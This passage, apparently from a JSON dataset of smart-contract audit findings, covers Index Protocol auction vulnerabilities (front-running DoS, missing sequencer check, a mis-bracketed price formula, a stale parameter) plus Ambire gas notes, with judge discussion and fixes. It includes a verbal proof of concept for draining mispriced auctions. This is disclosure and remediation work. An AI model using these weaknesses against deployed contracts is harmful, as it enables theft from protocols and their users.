DOS on higher bids, it is a DOS on **full inventory** bids which is a rarer occurrence. Big difference. Also such an \"attack\" does not benefit the attacker nor does it hurt the \"victim\" because they both want to buy assets at a lower price. \n\n Finally, there is a min price bound set by the manager. So any full inventory DOS at that point is completely useless and a waste of gas. \n\nAll of this is assuming that there are only 2 actors (the attacker and the victim) bidding. In reality, there will likely be many more and not all of them will submit a full inventory bid. \n\n\nI will not comment on this further \n\n**pblivin0x**\n\n> @pblivin0x @0xauditsea Correct me if I'm wrong, assuming here it is a Dutch auction where price reduces over time. If i can DOS someone who is ready to bid for a higher price and I bid for a lesser price after some time. Isn't this an issue?\n\nWe have a 1000 ETH auction, a legitimate bidder wants to settle the full 1000 ETH auction at `PRICE_HIGH`\n\nThe malicious bidder is willing to settle the 1000 ETH auction at `PRICE_LOW`, so they frontrun the legitimate bidder with `SMALL_SIZE` bid. \n\nIf some transactions are successfully DOS'd, the legitimate bidder could submit a 1000 ETH - `SMALL_SIZE` bid, or something like a 500 ETH bid, such that the malicious bidder is not willing to front run at that size\n\n**Oot2k**\n\n> > Escalate\n> > This issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk.\n> \n> Can't agree on this. This is definitely not an edge case. There is an incentive to perform such kind of a DoS - If the price of the auction decreases over time, users will probably want to prolong it as much as they can. Additionally, the DoS can very easily happen unintentionally, when a lot of bid transactions get executed in the same block.\n\nI think this is valid, this comment explains it well.\n\n**0xauditsea**\n\n> > @pblivin0x @0xauditsea Correct me if I'm wrong, assuming here it is a Dutch auction where price reduces over time. If i can DOS someone who is ready to bid for a higher price and I bid for a lesser price after some time. Isn't this an issue?\n> \n> We have a 1000 ETH auction, a legitimate bidder wants to settle the full 1000 ETH auction at `PRICE_HIGH`\n> \n> The malicious bidder is willing to settle the 1000 ETH auction at `PRICE_LOW`, so they frontrun the legitimate bidder with `SMALL_SIZE` bid.\n> \n> If some transactions are successfully DOS'd, the legitimate bidder could submit a 1000 ETH - `SMALL_SIZE` bid, or something like a 500 ETH bid, such that the malicious bidder is not willing to front run at that size\n\nTotally agree with this, no way front-runners would try it.\n\n**Arabadzhiew**\n\n> > @pblivin0x @0xauditsea Correct me if I'm wrong, assuming here it is a Dutch auction where price reduces over time. If i can DOS someone who is ready to bid for a higher price and I bid for a lesser price after some time. Isn't this an issue?\n> \n> We have a 1000 ETH auction, a legitimate bidder wants to settle the full 1000 ETH auction at `PRICE_HIGH`\n> \n> The malicious bidder is willing to settle the 1000 ETH auction at `PRICE_LOW`, so they frontrun the legitimate bidder with `SMALL_SIZE` bid.\n> \n> If some transactions are successfully DOS'd, the legitimate bidder could submit a 1000 ETH - `SMALL_SIZE` bid, or something like a 500 ETH bid, such that the malicious bidder is not willing to front run at that size\n\nCorrect me if I'm wrong, but even in your example, the legitimate bidder is most likely still going to end up buying the ETH at a lower price, leading to the protocol receiving less assets that it could have received. \n\nThe main issue here is that due to the current implementation, full inventory purchases are going to end up being reverted most of the time, be it due to intentional DoS attacks, or simply because there were a lot of bid transactions executed at the given time (for example, if there were 5 bid transactions sitting in the mempool with the same gas price and one of them was for a full inventory purchase, if that one does not get executed first, it will simply be reverted), leading to the component assets being sold at lower prices.\n\n**0xauditsea**\n\n@Arabadzhiew\nYou guys keep saying components are being sold at lower prices, if auction manager doesn't want them to be sold at lower prices, they should increase MIN price. When auction manager defines MIN price, it surely means that purchase at MIN price is pretty acceptable, this is pretty logical thing. Components being sold at lower price, good for buyers, acceptable for the auction manager, what is the problem here at all?\n\nRegarding the example you mentioned above, you are right that full purchase bid will be reverted when there is another bid tx is executed before it, I think that's fine, that's what the auction is for - first buyer gets what they want.\nIf you don't agree with this and let full purchase tx buy all remaining amount, it will cause an issue like, users wanted to buy whole 10WETH from the auction but they end up only buying 5WETH, do you think users will like this?\n\nOfc this issue needs to be fixed, but the severity can not be Med at all.\n\n**Arabadzhiew**\n\n> @Arabadzhiew You guys keep saying components are being sold at lower prices, if auction manager doesn't want them to be sold at lower prices, they should increase MIN price. When auction manager defines MIN price, it surely means that purchase at MIN price is pretty acceptable, this is pretty logical thing. Components being sold at lower price, good for buyers, acceptable for the auction manager, what is the problem here at all?\n> \n> Regarding the example you mentioned above, you are right that full purchase bid will be reverted when there is another bid tx is executed before it, I think that's fine, that's what the auction is for - first buyer gets what they want. If you don't agree with this and let full purchase tx buy all remaining amount, it will cause an issue like, users wanted to buy whole 10WETH from the auction but they end up only buying 5WETH, do you think users will like this?\n> \n> Ofc this issue needs to be fixed, but the severity can not be Med at all.\n\nSure, the MIN value is defined by the auction manager, but the fact that the component asset is going to be sold at a lower price is still a loss of funds for the protocol. The MIN value is there to make sure that the auction targets get reached, but I don't think the protocol team should be ok with receiving less assets, when they can receive more.\n\nAlso, regarding the mitigation recommended in this report, I think it is fine due to the fact that it is optional - users can only use the entire available balance purchase functionality if they explicitly say so, otherwise the bidding functionality should work as it currently does.\n\nI won't comment on this issue any further. Let's let the Sherlock team decide whether it is a valid medium or not.\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\nAfter consideration of the above comments this issue is a valid medium, DOS of a valid bid at a certain price in a Dutch auction is considered damage to how the auction functions. \n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [JJtheAndroid](https://github.com/sherlock-audit/2023-06-Index-judging/issues/41/#issuecomment-1658752271): rejected\n\n**hrishibhat**\n\nAdditionally, I see that the Sherlock rules are being interpreted incorrectly, will make sure to make the necessary changes to the docs and see how best any possible confusion can be avoided. \n\n**pblivin0x**\n\nThe remediation for this issue is open for review here https://github.com/IndexCoop/index-protocol/pull/25\n\nThe changes are to allow users to specify `type(uint256.max)` to settle the remaining auction https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L811-L817",
      "summary": "\nThis bug report focuses on the vulnerability in the AuctionRebalanceModuleV1.sol code that allows malicious users to frontrun full inventory asset purchases, thus preventing the transaction from executing as expected and leading to assets being sold under market value. This bug was found by 0x52 and Arabadzhiev and the code snippet was manually reviewed. \n\nThe impact of this bug is that malicious users can DOS legitimate users attempting to purchase the entire amount of component. This issue was initially marked as Medium severity, but it was later escalated to low/invalid as per Sherlock's rules.\n\nThe discussion around this bug focused on whether or not it was a valid issue and should be escalated. It was argued that there is an incentive to perform such kind of a DoS - If the price of the auction decreases over time, users will probably want to prolong it as much as they can. Additionally, the DoS can very easily happen unintentionally, when a lot of bid transactions get executed in the same block. It was also argued that the issue does not allow normal functioning of the dutch auction.\n\nThe counterargument was that there is no loss of funds at all and that users can only prolong the auction as long as the current price is higher than the min price. It was also argued that the unintentional scenario is not a DOS, it is just multiple people bidding at the same time.\n\nIn the end, it was agreed that this issue should be marked as Medium severity, as it does lead to the protocol receiving less assets than it could have received. The recommendation was to allow users to specify type(uint256.max) to swap the entire available balance.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Index Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-06-Index-judging/issues/41",
      "tags": [
        "Front-Running",
        "DOS",
        "Denial-Of-Service",
        "Auction"
      ],
      "finders": [
        "0x52",
        "Arabadzhiev"
      ]
    },
    {
      "id": "20906",
      "title": "M-3: No check for sequencer uptime can lead to dutch auctions executing at bad prices",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-06-Index-judging/issues/40 \n\n## Found by \n0x52\n## Summary\n\nWhen purchasing from dutch auctions on L2s there is no considering of sequencer uptime. When the sequencer is down, all transactions must originate from the L1. The issue with this is that these transactions use an aliased address. Since the set token contracts don't implement any way for these aliased addressed to interact with the protocol, no transactions can be processed during this time even with force L1 inclusion. If the sequencer goes offline during the the auction period then the auction will continue to decrease in price while the sequencer is offline. Once the sequencer comes back online, users will be able to buy tokens from these auctions at prices much lower than market price.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nAuction will sell/buy assets at prices much lower/higher than market price leading to large losses for the set token\n\n## Code Snippet\n\n[AuctionRebalanceModuleV1.sol#L772-L836](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L772-L836)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCheck sequencer uptime and invalidate the auction if the sequencer was ever down during the auction period\n\n\n\n## Discussion\n\n**pblivin0x**\n\nWhat exactly is the remediation here? To check an external uptime feed https://docs.chain.link/data-feeds/l2-sequencer-feeds ?\n\nNot sure if we will fix this issue. This may be on manager parameterizing the auction to select tight upper/lower bounds. \n\n**FlattestWhite**\n\nAgree won't fix - will look at again if we launch on an L2.\n\n**snake-poison**\n\nThe equivalent effect to this on L1 would be a reorg that would move time forward but not have had any bids on the canonical chain. The protection on this is the manager setting an appropriate floor for the auction as the \"loss\" outcome is no different than having no participants.\n\n**JJtheAndroid**\n\nEscalate \n\nThis issue should be invalid.\n\nEach auction has a min/max price\n\nAny asset price purchased within min/max bounds set by the manager, is what the manager is willing to accept in terms of asset price volatility.  These are not \"bad\" prices as described in the report. If the set token manager doesn't like the price that his/her asset is being sold for, then they simply set the min price  of the auction too low, making this an admin input error which is invalid as per Sherlock's rules.\n\n**sherlock-admin2**\n\n > Escalate \n> \n> This issue should be invalid.\n> \n> Each auction has a min/max price\n> \n> Any asset price purchased within min/max bounds set by the manager, is what the manager is willing to accept in terms of asset price volatility.  These are not \"bad\" prices as described in the report. If the set token manager doesn't like the price that his/her asset is being sold for, then they simply set the min price  of the auction too low, making this an admin input error which is invalid as per Sherlock's rules.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IAm0x52**\n\nA dutch auction price bounds are set specifically with the max price above the current market price and the min below the current market price. The expectation is that the auction will execute efficiently when the market price is the same as the auction price. I have shown a scenario where the auction is unable to execute as expected due to sequencer downtime. While the admin can lessen the potential loss of this, due to the nature of a dutch auction they cannot prevent it simply with a min/max bound on price.\n\n**pblivin0x**\n\nI am fine with whatever result for this issue. Medium or Low. \n\n**Oot2k**\n\nI think this is valid, (in past this issue has been valid and the report shows clear impact)\nTeam mentions that they plan to deploy on layer2 so even if this is a \"wont fix\" I believe its valid.\n\n**0xauditsea**\n\n@Oot2k - Where is impact at all? No loss of tokens, benefits for users.\n\n**pblivin0x**\n\n> @Oot2k - Where is impact at all? No loss of tokens, benefits for users.\n\nSuppose we have a dutch auction which starts at 10% above market price and ends at 10% below market price, if sequencer goes down, the auction never had a chance to fill at 0%, and users are hurt because the SetToken did not perform a valid L2 check on their auction\n\n**0xauditsea**\n\nNo more comments attached, hope you guys make a right decision. Needs fairness.\n\n**hrishibhat**\n\n@0xauditsea \n>  hope you guys make a right decision. Needs fairness.\n\nI think this [comment](https://github.com/sherlock-audit/2023-06-Index-judging/issues/40#issuecomment-1664743039) explains why this issue is valid and is fair to reward this.\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nConsidering this a valid medium based on the above comments\nhttps://github.com/sherlock-audit/2023-06-Index-judging/issues/40#issuecomment-1664743039\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [JJtheAndroid](https://github.com/sherlock-audit/2023-06-Index-judging/issues/40/#issuecomment-1658472619): rejected\n\n**pblivin0x**\n\nThis issue will not be resolved in remediations, but the following warning was added to the contract documentation https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L53-L55",
      "summary": "\nThis bug report is about a vulnerability in the L2 Dutch Auction process of the Index Protocol. The vulnerability is that when the sequencer goes offline, transactions must originate from the L1, which uses an aliased address. This means that no transactions can be processed during the offline period, even with force L1 inclusion. This can result in users being able to purchase tokens from these auctions at prices much lower than the market price. \n\nThe code snippet provided is from the AuctionRebalanceModuleV1.sol#L772-L836 file on Github. It was found manually. \n\nThe impact of this vulnerability is that the auction will sell/buy assets at prices much lower/higher than market price, leading to large losses for the set token.\n\nThe discussion by the team was that the issue should not be fixed, as it is more likely an admin input error. However, a warning was added to the contract documentation as a precaution. In the end, the issue was marked as a valid medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Index Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-06-Index-judging/issues/40",
      "tags": [
        "L2 Sequencer",
        "Auction",
        "Missing Check"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "20905",
      "title": "M-2: price is calculated wrongly in BoundedStepwiseExponentialPriceAdapter",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-06-Index-judging/issues/39 \n\n## Found by \n0x007, 0x52, Brenzee, auditsea, dany.armstrong90\n## Summary\nThe BoundedStepwiseExponentialPriceAdapter contract is trying to implement price change as `scalingFactor * (e^x - 1)` but the code implements `scalingFactor * e^x - 1`. Since there are no brackets, multiplication would be executed before subtraction. And this has been confirmed with one of the team members.\n\n## Vulnerability Detail\nThe [getPrice code](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L40-L73) has been simplified as the following when boundary/edge cases are ignored\n\n```solidity\n(\n    uint256 initialPrice,\n    uint256 scalingFactor,\n    uint256 timeCoefficient,\n    uint256 bucketSize,\n    bool isDecreasing,\n    uint256 maxPrice,\n    uint256 minPrice\n) = getDecodedData(_priceAdapterConfigData);\n\nuint256 timeBucket = _timeElapsed / bucketSize;\n\nint256 expArgument = int256(timeCoefficient * timeBucket);\n\nuint256 expExpression = uint256(FixedPointMathLib.expWad(expArgument));\n\nuint256 priceChange = scalingFactor * expExpression - WAD;\n```\n\nWhen timeBucket is 0, we want priceChange to be 0, so that the returned price would be the initial price. Since `e^0 = 1`, we need to subtract 1 (in WAD) from the `expExpression`. \n\nHowever, with the incorrect implementation, the returned price would be different than real price by a value equal to `scalingFactor - 1`. The image below shows the difference between the right and wrong formula when initialPrice is 100 and scalingFactor is 11. The right formula starts at 100 while the wrong one starts at 110=100+11-1\n\n![newplot (11)](https://github.com/sherlock-audit/2023-06-Index-bizzyvinci/assets/22333930/56cfc3e4-2bca-40d3-99bd-9e02df94bf33)\n\n\n\n## Impact\nIncorrect price is returned from BoundedStepwiseExponentialPriceAdapter and that will have devastating effects on rebalance.\n\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L73\n\n## Tool used\n\nManual Review\n\n## Recommendation\nChange the following [line](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L73)\n```solidity\n- uint256 priceChange = scalingFactor * expExpression - WAD;\n+ uint256 priceChange = scalingFactor * (expExpression - WAD);\n```\n\n\n\n## Discussion\n\n**pblivin0x**\n\nConfirmed \n\n**IAm0x52**\n\nEscalate\n\nThis should be medium not high. While it is true that the calculation will be wrong for scaling factors other than 1, it heavily depends on the configuration of auction settings as to whether this sells assets at a bad price and causes a loss to the set token.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This should be medium not high. While it is true that the calculation will be wrong for scaling factors other than 1, it heavily depends on the configuration of auction settings as to whether this sells assets at a bad price and causes a loss to the set token.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**pblivin0x**\n\n> Escalate\n> \n> This should be medium not high. While it is true that the calculation will be wrong for scaling factors other than 1, it heavily depends on the configuration of auction settings as to whether this sells assets at a bad price and causes a loss to the set token.\n\nAgree here this should be a medium not a high\n\n1) manager's are expected to preview full auction price curves ahead of a `startRebalance` call by calling the pure function `getPrice` with input `_timeElapsed` in the range `[0, _duration]`\n\n2) the difference is not catastrophic, it is a shift that stays constant throughout the auction https://colab.research.google.com/drive/1ZkXs2MuTJFaWUU611KolNXQ52zh9k3VM?usp=sharing\n\n![issue_39](https://github.com/sherlock-audit/2023-06-Index-judging/assets/84149824/64dbbd35-c5d8-4e0a-b952-67b6da0e8d2e)\n\n\n**bizzyvinci**\n\n> manager's are expected to preview full auction price curves ahead of a startRebalance call by calling the pure function getPrice with input _timeElapsed in the range [0, _duration]\n\ngetPrice only takes in one _timeElapsed (not array), so managers can't view full curve. Also, the curve is directly affected by `timeBucket`, rather than `_timeElapsed`. Different `_timeElapsed` could give the same price depending on bucketSize. There's hardly a simulation or plotting tool for solidity, so it might be done in other languages like we're doing right now.\n\n> the difference is not catastrophic\n\nIt could be very catastrophic mainly because it affects priceChange (which would then be added or subtracted from price). WE DON'T KNOW WHAT INITIAL PRICE IS. It could be `10,000`, it could `20`, it could be `0.1`, it could be `1e-12`.\n\n## POC\n* A manager wants to switch stablecoins. He wants to buy DAI and Sell USDT at a price of minimum and initial price of `1` and increasing to `1.05`.\n* Technically, the price is not 1, but rather `1e-12` because of decimals `1e6/1e18` (1e6 in WAD)\n\n### With the right formula\n* If he uses the scalingFactor of `2`, the priceChange at `t0` would be 0\n* Therefore bidder would have to pay 1e18 DAI for 1e6USDT.\n\n### With the wrong formula\n* If he uses the scalingFactor of `2`, the priceChange at `t0` would `1` (1e18 in WAD) instead of `0`\n* Therefore the price would increase by a magnitude 1e12. \n* Therefore, bidder would pay approximately 1e18 DAI for 1e6 * 1e12 USDT.\n* Attacker could take 1e12 (1 trillion USDT) with one DAI in a flash.\n* Or if there's not enough liquidity e.g if there's only 1m USDT, then he'll pay `1e-12` DAI. That's less than a penny.\n\n\n**bizzyvinci**\n\nMy bad, I agree with Med cause the catastrophe is bounded by min and [max](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L86) value.\n\n**pblivin0x**\n\n> My bad, I agree with Med cause the catastrophe is bounded by min and [max](https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L86) value.\n\nI think we all agree this should be de-escalated to a Medium\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates \nConsidering this a valid medium based on the above comments. \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-06-Index-judging/issues/39/#issuecomment-1660521258): accepted\n\n**pblivin0x**\n\nThe remediation for this issue is open for review here https://github.com/IndexCoop/index-protocol/pull/25\n\nThe fix to the formula is here: https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L73",
      "summary": "\n\nThis bug report is about an issue with the BoundedStepwiseExponentialPriceAdapter contract, which is trying to implement price change as `scalingFactor * (e^x - 1)` but the code implements `scalingFactor * e^x - 1`. This incorrect implementation means the returned price would be different than the real price by a value equal to `scalingFactor - 1`. This issue is serious as it could have devastating effects on rebalance.\n\nThe issue was found by 0x007, 0x52, Brenzee, auditsea, and dany.armstrong90, who then discussed the impact of the issue. It was agreed that the issue should be a medium rather than a high, as it is bounded by the min and max values. The code snippet that needs to be changed is at https://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L73 and the recommended change is to add brackets to the formula.\n\nThe remediation for this issue is open for review at https://github.com/IndexCoop/index-protocol/pull/25 and the fix to the formula is at https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/integration/auction-price/BoundedStepwiseExponentialPriceAdapter.sol#L73. The bug report has been resolved successfully.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Index Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-06-Index-judging/issues/39",
      "tags": [
        "Wrong Math",
        "Coding-Bug"
      ],
      "finders": [
        "0x52",
        "dany.armstrong90",
        "Brenzee",
        "auditsea",
        "0x007"
      ]
    },
    {
      "id": "20904",
      "title": "M-1: SetToken can't be unlocked early.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-06-Index-judging/issues/38 \n\n## Found by \n0x52, Yuki, auditsea, qandisa\n## Summary\nSetToken can't be unlocked early\n\n## Vulnerability Detail\nThe function unlock() is used to unlock the setToken after rebalancing, as how it is right now there are two ways to unlock the setToken.\n\n- can be unlocked once the rebalance duration has elapsed\n- can be unlocked early if all targets are met, there is excess or at-target quote asset, and raiseTargetPercentage is zero\n```solidity\n    function unlock(ISetToken _setToken) external {\n        bool isRebalanceDurationElapsed = _isRebalanceDurationElapsed(_setToken);\n        bool canUnlockEarly = _canUnlockEarly(_setToken);\n\n        // Ensure that either the rebalance duration has elapsed or the conditions for early unlock are met\n        require(isRebalanceDurationElapsed || canUnlockEarly, \"Cannot unlock early unless all targets are met and raiseTargetPercentage is zero\");\n\n        // If unlocking early, update the state\n        if (canUnlockEarly) {\n            delete rebalanceInfo[_setToken].rebalanceDuration;\n            emit LockedRebalanceEndedEarly(_setToken);\n        }\n\n        // Unlock the SetToken\n        _setToken.unlock();\n    }\n```\n```solidity\n    function _canUnlockEarly(ISetToken _setToken) internal view returns (bool) {\n        RebalanceInfo storage rebalance = rebalanceInfo[_setToken];\n        return _allTargetsMet(_setToken) && _isQuoteAssetExcessOrAtTarget(_setToken) && rebalance.raiseTargetPercentage == 0;\n    }\n```\n\nThe main problem occurs as the value of raiseTargetPercentage isn't reset after rebalancing. The other thing is that the function setRaiseTargetPercentage can't be used to fix this issue as it doesn't allow giving raiseTargetPercentage a zero value.\n\nA setToken can use the AuctionModule to rebalance multiple times, duo to the fact that raiseTargetPercentage value isn't reset after every rebalancing. Once changed with the help of the function setRaiseTargetPercentage this value will only be non zero for every next rebalancing. A setToken can be unlocked early only if all other requirements are met and the raiseTargetPercentage equals zero.\n\nThis problem prevents for a setToken to be unlocked early on the next rebalances, once the value of the variable raiseTargetPercentage is set to non zero. \n\nOn every rebalance a manager should be able to keep the value of raiseTargetPercentage to zero (so the setToken can be unlocked early), or increase it at any time with the function setRaiseTargetPercentage.\n\n```solidity\n    function setRaiseTargetPercentage(\n        ISetToken _setToken,\n        uint256 _raiseTargetPercentage\n    )\n        external\n        onlyManagerAndValidSet(_setToken)\n    {\n        // Ensure the raise target percentage is greater than 0\n        require(_raiseTargetPercentage > 0, \"Target percentage must be greater than 0\");\n\n        // Update the raise target percentage in the RebalanceInfo struct\n        rebalanceInfo[_setToken].raiseTargetPercentage = _raiseTargetPercentage;\n\n        // Emit an event to log the updated raise target percentage\n        emit RaiseTargetPercentageUpdated(_setToken, _raiseTargetPercentage);\n    }\n```\n\n## Impact\nOnce the value of raiseTargetPercentage is set to non zero, every next rebalancing of the setToken won't be eligible for unlocking early. As the value of raiseTargetPercentage isn't reset after every rebalance and neither the manager can set it back to zero with the function setRaiseTargetPercentage().\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-06-Index/blob/main/index-protocol/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L389\n\n## Tool used\n\nManual Review\n\n## Recommendation\nRecommend to reset the value raiseTargetPercentage after every rebalancing.\n\n```solidity\n    function unlock(ISetToken _setToken) external {\n        bool isRebalanceDurationElapsed = _isRebalanceDurationElapsed(_setToken);\n        bool canUnlockEarly = _canUnlockEarly(_setToken);\n\n        // Ensure that either the rebalance duration has elapsed or the conditions for early unlock are met\n        require(isRebalanceDurationElapsed || canUnlockEarly, \"Cannot unlock early unless all targets are met and raiseTargetPercentage is zero\");\n\n        // If unlocking early, update the state\n        if (canUnlockEarly) {\n            delete rebalanceInfo[_setToken].rebalanceDuration;\n            emit LockedRebalanceEndedEarly(_setToken);\n        }\n\n+       rebalanceInfo[_setToken].raiseTargetPercentage = 0;\n\n        // Unlock the SetToken\n        _setToken.unlock();\n    }\n```\n\n\n\n## Discussion\n\n**pblivin0x**\n\nThe risk here is a stale `raiseTargetPercentage` can lead to a SetToken that cannot be unlocked early?\n\nDebating if we should include this or not.\n\n**FlattestWhite**\n\nShould raiseTargetPercentage be part of the check for unlocking early? I'm thinking it doesn't since that's only used when needing to `raiseTargetAssets` because we met all our targets and we have leftover WETH.\n\n**pblivin0x**\n\nsince we can't set the raiseAssetTarget to zero, this is a valid issue. will fix \n\n**snake-poison**\n\n> since we can't set the raiseAssetTarget to zero, this is a valid issue. will fix\n\nYea I agree with the assessment and looks like the fix is more or less clear. \n\n**pblivin0x**\n\nThe remediation for this issue is open for review here https://github.com/IndexCoop/index-protocol/pull/25\n\nThe changes are to \n1) Allow the `raiseTargetPercentage` to be set to 0: https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L420-L439\n2) Reset the `raiseTargetPercentage` on every `unlock()` call https://github.com/IndexCoop/index-protocol/blob/839a6c699cc9217c8ee9f3b67418c64e80f0e10d/contracts/protocol/modules/v1/AuctionRebalanceModuleV1.sol#L414",
      "summary": "\nThis bug report is about the SetToken not being able to be unlocked early. This is due to the value of raiseTargetPercentage not being reset after rebalancing. The function setRaiseTargetPercentage can't be used to fix this issue as it doesn't allow giving raiseTargetPercentage a zero value. This issue prevents a SetToken from being unlocked early on the next rebalances, once the value of the variable raiseTargetPercentage is set to non zero. \n\nThe impact of this issue is that after the value of raiseTargetPercentage is set to non zero, every next rebalancing of the SetToken won't be eligible for unlocking early. As the value of raiseTargetPercentage isn't reset after every rebalance and neither the manager can set it back to zero with the function setRaiseTargetPercentage().\n\nThe solution to this issue is to reset the value raiseTargetPercentage after every rebalancing. This can be done by adding the following line of code to the function unlock():\n\n```solidity\nrebalanceInfo[_setToken].raiseTargetPercentage = 0;\n```\n\nThis change has been proposed and is open for review on Github. The changes are to 1) Allow the raiseTargetPercentage to be set to 0 and 2) Reset the raiseTargetPercentage on every unlock() call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Index Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-06-Index-judging/issues/38",
      "tags": [
        "Missing-Logic",
        "Don't update state"
      ],
      "finders": [
        "qisa",
        "Yuki",
        "0x52",
        "auditsea"
      ]
    },
    {
      "id": "25903",
      "title": "[G-07] Constructors may be declared `payable` to save gas",
      "impact": "GAS",
      "content": "Instances:<br>\nAmbireAccount.sol#L58\nAmbireAccountFactory.sol#L11\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25902",
      "title": "[G-06] It is more gas efficient to revert with a custom error than a `require` with a string",
      "impact": "GAS",
      "content": "\nSee [Gas Optimizations Report](https://github.com/code-423n4/2023-05-ambire-findings/issues/35) for details. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25901",
      "title": "[G-05] Unnecessary declaration of `currentNonce``",
      "impact": "GAS",
      "content": "In `AmbireAccount.execute()` `currentNonce` is declared: `uint256 currentNonce = nonce;` (`AmbireAccount.sol#L136`), but never changed, and then used to update `nonce`: `nonce = currentNonce + 1;` (`AmbireAccount.sol#L189`). `nonce` alone can be used throughout and then incremented by `nonce++`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25900",
      "title": "[G-04] Unnecessary require in `SignatureValidator.recoverAddrImpl()`",
      "impact": "GAS",
      "content": "`address signer = address(wallet);` so `require(signer != address(0), 'SV_ZERO_SIG');` is redundant in `SignatureValidator.recoverAddrImpl()`, as it would already have reverted in `wallet.isValidSignature(hash, sig)`, because of a function call to the zero address.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ambire",
      "source_link": "https://code4rena.com/reports/2023-05-ambire",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25899",
      "title": "[G-03] Unnecessary require in `AmbireAccountFactory.deploySafe()`",
      "impact": "GAS",
      "content": "`AmbireAccountFactory.deploySafe(code, salt)` returns the address where the bytecode \"code\" is deployed itself, deploying it first if it isn't already deployed. Therefore, it is meaningless to check that the fresh deployment is successful, which only amounts to checking that the opcode `CREATE2` works as expected. Specifically:\n`require(addr == expectedAddr, 'FAILED_MATCH');` in `AmbireAccountFactory.deploySafe()` can be removed, as it must be assumed that the calculation of `expectedAddr` is correct.\n`require(addr != address(0), 'FAILED_DEPLOYING');` will never trigger, as `CREATE2` only returns `address(0)` when trying to deploy to the same address twice, which is not the case since it is already checked that `extcodesize(addr) == 0`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
